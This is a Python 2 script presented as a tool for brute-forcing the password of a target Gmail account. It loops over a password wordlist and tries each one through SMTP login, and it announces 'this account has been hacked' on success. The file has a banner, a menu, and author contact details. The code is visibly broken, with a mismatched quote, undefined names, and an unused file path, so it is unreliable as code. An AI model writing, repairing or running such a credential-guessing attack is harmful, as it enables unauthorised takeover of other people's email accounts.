#!/usr/bin/python
'''coded by ayoub sirai'''

import smtplib
from os import system

def main():
   print '================================================='
   print '               coded by Technical Naqeeb              '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '  _,.                                            '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '           ()                '

main()
print '[1] start the brute force attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('enter the path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(Password.txt')
pass_list = Password.txt.readlines()
def login():
    i = 0
    user_name = raw_input('enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in Password.txt:
      i = i + 1
      print str(i) + '/' + str(len(Password.tx))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] this account has been hacked, password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
  ' Contact On Whatapp     +923488136133
   Facebook          www.facebook.com/Technical.naqeeb.133
   
